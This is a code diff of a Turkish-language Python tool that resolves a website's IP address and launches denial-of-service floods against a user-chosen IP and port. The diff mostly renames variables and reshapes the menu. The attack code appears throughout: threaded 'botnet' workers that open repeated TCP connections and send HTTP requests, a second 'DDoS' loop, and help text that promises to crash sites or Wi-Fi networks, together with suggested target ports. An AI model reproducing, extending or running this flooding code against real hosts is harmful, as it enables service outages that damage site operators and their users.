@@ -4,14 +4,13 @@ import netifaces
 import time
 import sys
 import pyfiglet
-import requests
 from colorama import Fore
 from urllib.parse import urlparse
 
 def slow_print(text):
     for char in text:
         print(char, end='', flush=True)
-        time.sleep(0.016)
+        time.sleep(0.014)
     print()
 
 def figlet():
@@ -19,26 +18,18 @@ def figlet():
     print(Fore.GREEN)
     slow_print(ascii_art)
 
-print(Fore.RED + """    DİKKAT! YAPILAN İŞLEMLER İÇİN SORUMLULUK KABUL
+def print_warning():
+    print(Fore.RED + """    DİKKAT! YAPILAN İŞLEMLER İÇİN SORUMLULUK KABUL
                      ETMİYORUZ.""")
-time.sleep(1.5)
-figlet()
+    time.sleep(2)
 
-saldırı_hızı = 1
-saldırı_zamanlayıcı = 1 / saldırı_hızı
-
-saldırı_devam_ediyor = False
-saldırı_sayacı = 0
-maksimum_saldırı = None
-
-def get_external_ip(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            return response.text
-    except Exception as e:
-        print(Fore.RED + f"Hata: {e}")
-    return None
+def print_menu():
+    print(Fore.GREEN + "  [1] IP Bilgilerini Göster")
+    print(Fore.GREEN + "  [2] Linkten IP Adresini Al")
+    print(Fore.GREEN + "  [3] Ağ Saldırısı Yap")
+    print(Fore.GREEN + "  [4] DDoS Saldırısı Yap")
+    print(Fore.GREEN + "  [5] Bu Tool Ne İşe Yarar?")
+    print(Fore.GREEN + "  [6] Çıkış Yap")
 
 def get_local_ip_addresses():
     ip_addresses = []
@@ -50,34 +41,28 @@ def get_local_ip_addresses():
                 ip_addresses.append(address_info['addr'])
     return ip_addresses
 
-def list_local_ip_addresses():
-    print(Fore.GREEN + "Yerel IP Adresiniz:")
+def print_local_ip_addresses():
+    print(Fore.GREEN + "  Yerel IP Adresiniz:")
     ip_addresses = get_local_ip_addresses()
     for ip in ip_addresses:
-        print(Fore.YELLOW + ip)
+        print(Fore.YELLOW + f"  {ip}\n")
 
-def get_ip_and_port_from_url(url):
+def get_ip_from_url(url):
     try:
         parsed_url = urlparse(url)
         if parsed_url.netloc:
-            return socket.gethostbyname(parsed_url.hostname), parsed_url.port
+            return socket.gethostbyname(parsed_url.netloc)
         else:
             raise ValueError("Geçersiz URL")
     except Exception as e:
-        print(Fore.RED + f"Hata: {e}")
-    return None, None
+        print(Fore.RED + f"  Hata: {e}")
+    return None
 
-def list_external_ip_address():
-    input_url = input(Fore.GREEN + "Site URL'sini Girin: ")
-    parsed_url = urlparse(input_url)
-    if parsed_url.scheme:
-        try:
-            ip_address = socket.gethostbyname(parsed_url.netloc)
-            print(Fore.CYAN + f"Site IP Adresi: {ip_address}\n")
-        except Exception as e:
-            print(Fore.RED + f"Hata: {e}")
-    else:
-        print(Fore.RED + "Geçersiz URL!")
+def print_external_ip_address():
+    input_url = input(Fore.GREEN + "  Site URL'sini Girin: ")
+    ip_address = get_ip_from_url(input_url)
+    if ip_address:
+        print(Fore.CYAN + f"  Site IP Adresi: {ip_address}\n")
 
 def is_valid_ip(ip):
     try:
@@ -95,116 +80,112 @@ def is_valid_port(port):
 
 def get_valid_ip():
     while True:
-        ip = input(Fore.GREEN + "Hedef IP Adresini Girin: ")
+        ip = input(Fore.GREEN + "  Hedef IP Adresini Girin: ")
         if is_valid_ip(ip):
             return ip
         else:
-            print(Fore.RED + "Geçersiz IP adresi! Doğru IP Adresi Girin.")
+            print(Fore.RED + "  Geçersiz IP adresi! Lütfen doğru IP Adresi Girin.")
 
 def get_valid_port():
     while True:
-        port = input(Fore.GREEN + "Hedef Port Numarasını Girin: ")
+        port = input(Fore.GREEN + "  Hedef Port Numarasını Girin: ")
         if is_valid_port(port):
             return int(port)
         else:
-            print(Fore.RED + "Geçersiz Port Numarası!")
+            print(Fore.RED + "  Geçersiz Port Numarası! Lütfen doğru Port Numarası Girin.")
 
-def saldırı_durumu_görselleştir():
-    global saldırı_devam_ediyor
-    global saldırı_sayacı
-    global maksimum_saldırı
-    while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
-        print(Fore.CYAN + f"Saldırı Devam Ediyor: {saldırı_sayacı}/{maksimum_saldırı} paket gönderildi")
-        time.sleep(saldırı_zamanlayıcı)
+def visualize_attack_status():
+    global attack_ongoing
+    global attack_counter
+    global max_attack
+    while attack_ongoing and (max_attack is None or attack_counter < max_attack):
+        time.sleep(2)
+        print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi")
+        attack_delay = 0.5
 
-    if not saldırı_devam_ediyor:
-        print(Fore.YELLOW + "Saldırı Durduruldu. Ana Menüye Dönülüyor...")
-        time.sleep(3)
-        main_menu()
+     
 
-def botnet_olustur(hedef_ip, hedef_port, bot_sayisi):
-    def syn_flood_saldırısı(bot_numarası, hedef_ip, hedef_port):
-        global saldırı_devam_ediyor
-        global saldırı_sayacı
-        while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
+def create_botnet(target_ip, target_port, bot_count):
+    def syn_flood_attack(bot_number, target_ip, target_port):
+        global attack_ongoing
+        global attack_counter
+        while attack_ongoing and (max_attack is None or attack_counter < max_attack):
             try:
-                bot_soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                bot_soket.connect((hedef_ip, hedef_port))
-                bot_soket.send(b"GET / HTTP/1.1\r\n")
-                bot_soket.send(b"Host: " + hedef_ip.encode() + b"\r\n\r\n")
-                bot_soket.close()
-                print(Fore.GREEN + f"Saldırı Başlatıldı: Bot-{bot_numarası}, Hedef: {hedef_ip}:{hedef_port}")
+                bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                bot_socket.connect((target_ip, target_port))
+                bot_socket.send(b"GET / HTTP/1.1\r\n")
+                bot_socket.send(b"Host: " + target_ip.encode() + b"\r\n\r\n")
+                bot_socket.close()
+                print(Fore.GREEN + f"  Saldırı Başlatıldı: Bot-{bot_number}, Hedef: {target_ip}:{target_port}")
                 time.sleep(0.5)
-                saldırı_sayacı += 1
+                attack_counter += 1
             except Exception as e:
-                print(Fore.RED + f"Hata Oluştu Geçersiz IP Adresi Yada Port:\n{e}")
+                print(Fore.RED + f"  Hata Oluştu: {e}")
+                attack_ongoing = False
+                time.sleep(3)
+                
 
-    for i in range(bot_sayisi):
-        bot_thread = threading.Thread(target=syn_flood_saldırısı, args=(i+1, hedef_ip, hedef_port))
+    for i in range(bot_count):
+        bot_thread = threading.Thread(target=syn_flood_attack, args=(i+1, target_ip, target_port))
         bot_thread.daemon = True
         bot_thread.start()
 
-    threading.Thread(target=saldırı_durumu_görselleştir).start()
+    threading.Thread(target=visualize_attack_status).start()
+
 
 def ddos(target_ip, target_port, packet_count):
-    for _ in range(packet_count):
+   for _ in range(packet_count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
             s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
             s.sendto(("Host: " + target_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
             s.close()
-            print(f"DDoS Saldırısı Başlatıldı {target_ip}:{target_port}")
+            print(Fore.GREEN + f"  DDoS Saldırısı Başlatıldı: Hedef: {target_ip}:{target_port}")
         except Exception as e:
-            print(f"DDoS Saldırısı Başlatılamadı {target_ip}:{target_port}: {e}")
+            print(Fore.RED + f"  DDoS Saldırısı Başlatılamadı: Hedef: {target_ip}:{target_port}: {e}")
 
 def ddos_menu():
-    target_ip = input(Fore.GREEN + "Hedef IP Adresini Girin: ")  
-    target_port = int(input(Fore.GREEN + "Hedef Port Numarasını Girin: "))
-    packet_count = int(input(Fore.GREEN + "Kaç Kez Gönderilsin: "))
-
+    target_ip = input(Fore.GREEN + "  Hedef IP Adresini Girin: ")
+    target_port = int(input(Fore.GREEN + "  Hedef Port Numarasını Girin: "))
+    packet_count = int(input(Fore.GREEN + "  Kaç Kez Gönderilsin: "))
     ddos(target_ip, target_port, packet_count)
-    print(Fore.GREEN + "DDoS Saldırısı Tamamlandı.\n")
+    print(Fore.GREEN + "  DDoS Saldırısı Tamamlandı.\n")
     main_menu()
 
 def attack_menu():
-    global saldırı_devam_ediyor
-    global saldırı_sayacı
-    global maksimum_saldırı
-    hedef_ip = get_valid_ip()
-    hedef_port = get_valid_port()
-    bot_sayisi = int(input(Fore.GREEN + "Bot Sayısını Girin: "))
-    maksimum_saldırı = int(input(Fore.GREEN + "Saldırı Kaç Olunca Durdurulsun: "))
+    global attack_ongoing
+    global attack_counter
+    global max_attack
+    target_ip = get_valid_ip()
+    target_port = get_valid_port()
+    bot_count = int(input(Fore.GREEN + "  Bot Sayısını Girin: "))
+    max_attack = int(input(Fore.GREEN + "  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: "))
 
-    print(Fore.CYAN + "Botnet Saldırısı Başlatılıyor...")
-    print(Fore.CYAN + f"Hedef IP: {hedef_ip}")
-    print(Fore.CYAN + f"Hedef Port: {hedef_port}")
-    print(Fore.CYAN + f"Bot Sayısı: {bot_sayisi}")
-    print(Fore.CYAN + f"Saldırı Kaç Olunca Durdurulsun: {maksimum_saldırı}")
+    print(Fore.CYAN + "  Botnet Saldırısı Başlatılıyor...")
+    print(Fore.CYAN + f"  Hedef IP: {target_ip}")
+    print(Fore.CYAN + f"  Hedef Port: {target_port}")
+    print(Fore.CYAN + f"  Bot Sayısı: {bot_count}")
+    print(Fore.CYAN + f"  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: {max_attack}")
 
-    saldırı_devam_ediyor = True
-    botnet_olustur(hedef_ip, hedef_port, bot_sayisi)
+    attack_ongoing = True
+    create_botnet(target_ip, target_port, bot_count)
 
-    while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
+    while attack_ongoing and (max_attack is None or attack_counter < max_attack):
         pass
 
 def main_menu():
-    global saldırı_devam_ediyor
-    global saldırı_sayacı
-    global maksimum_saldırı
+    global attack_ongoing
+    global attack_counter
+    global max_attack
     while True:
         time.sleep(2)
-        print(Fore.GREEN + "[1] IP Adres Bilgilerin")
-        print(Fore.GREEN + "[2] Link Gir IP Çeksin")
-        print(Fore.GREEN + "[3] IP Saldırı Yap")
-        print(Fore.GREEN + "[4] DDoS Saldırısı Yap")
-        print(Fore.GREEN + "[5] Bu Tool Ne İşe Yarar?")
-        print(Fore.GREEN + "[6] Çıkış Yap")
-        choice = input(Fore.GREEN + "~$ ")
+        print_menu()
+        choice = input(Fore.GREEN + "  ~$ ")
         if choice == "1":
-            list_local_ip_addresses()
+            print_local_ip_addresses()
         elif choice == "2":
-            list_external_ip_address()
+            print_external_ip_address()
         elif choice == "3":
             attack_menu()
         elif choice == "4":
@@ -215,19 +196,24 @@ def main_menu():
   
   Seçenek [2] https:// Diye Girdiğin Sitenin\n  IP'sini Getirir
   
-  Seçenek [3] IP Saldırı Yapar, Wi-fi IP'si\n  Veri Tüketimi Artırır Yada Çökme Yapar Wi-fi'Ye
+  Seçenek [3] Ağ'a Saldırı Yapar Veri Tüketimi\n  Artırır Yada Çökme Yapar Wi-fi'Ye
   
   Seçenek [4] DDoS Saldırısı Siteyi Çökertir.
   
   Port İstendiğinde IP'ye Bağlı 80,8080,443\n  Deneyebilirsiniz.
 """)
         elif choice == "6":
-            print(Fore.YELLOW + "Çıkış Yapılıyor...")
+            print(Fore.YELLOW + "  Çıkış Yapılıyor...")
             time.sleep(2)
-            saldırı_devam_ediyor = False
+            attack_ongoing = False
             sys.exit()
         else:
-            print(Fore.RED + "GEÇERSİZ SEÇİM!")
+            print(Fore.RED + "  GEÇERSİZ SEÇİM!")
 
 if __name__ == "__main__":
+    attack_ongoing = False
+    attack_counter = 0
+    max_attack = None
+    print_warning()
+    figlet()
     main_menu()
